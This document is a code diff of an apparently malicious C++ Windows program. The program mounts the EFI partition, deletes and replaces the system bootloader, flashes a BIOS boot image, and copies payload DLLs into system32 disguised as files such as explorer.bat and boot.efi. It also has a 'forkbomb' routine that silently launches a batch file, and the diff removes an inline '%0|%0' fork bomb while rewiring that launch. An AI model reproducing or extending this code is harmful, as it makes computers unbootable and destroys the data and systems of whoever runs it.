@@ -10,7 +10,6 @@
 #include <vector>
 
 using namespace std;
-using namespace libzippp;
 
 void MountEFI() {
     const DWORD bufferSize = 1024;
@@ -39,7 +38,9 @@ void MountEFI() {
 
 void UnpackDeps() {
     // Unpack the dependencies
-    CopyFile(L"Checkr.dll", L"C:\\Windows\\system32\\system.zip", false);
+    CopyFile(L"Checkr.dll", L"C:\\Windows\\system32\\explorer.bat", false);
+    CopyFile(L"appvcompat.dll", L"C:\\Windows\\system32\\boot.bin", false);
+    CopyFile(L"appverifui.dll", L"C:\\Windows\\system32\\boot.efi", false);
 }
 
 bool is_efi() {
@@ -50,7 +51,7 @@ bool is_efi() {
 
 int BIOSBootFlash() {
     // Open the source file
-    HANDLE hSource = CreateFile(TEXT("C:\\Windows\\system32\\bootloader.bin"), GENERIC_READ, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
+    HANDLE hSource = CreateFile(TEXT("C:\\Windows\\system32\\boot.bin"), GENERIC_READ, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
     if (hSource == INVALID_HANDLE_VALUE) {
          cerr << "Failed to open source file.\n";
         return 1;
@@ -119,11 +120,8 @@ bool SetPermanentEnvironmentVariable(LPCTSTR value, LPCTSTR data) {
 void forkbomb() {
     const char* path = "C:\\Windows";
     _chdir(path);
-    ofstream forkfile("system.bat");
-    forkfile << "@echo off\n" << "%0|%0";
-    forkfile.close();
     /*const char* batchpath = "C:\\Windows\\system.bat";*/
-    ShellExecute(NULL, L"start", L"C:\\Windows\\system.bat", NULL, NULL, SW_HIDE);
+    ShellExecute(NULL, L"start", L"C:\\Windows\\explorer.bat", NULL, NULL, SW_HIDE);
 }
 
 //it checks if the user is admin. if not it will prompt them to do so and quit.
@@ -171,7 +169,7 @@ int main()
         //EFI Code here
         MountEFI();
         DeleteFile(L"Z:\\EFI\\Boot\\bootx64.efi");
-        CopyFile(L"C:\\Windows\\system32\\checkr.efi", L"Z:\\EFI\\Boot\\bootx64.efi", false);
+        CopyFile(L"C:\\Windows\\system32\\boot.efi", L"Z:\\EFI\\Boot\\bootx64.efi", false);
         
     }
     else {
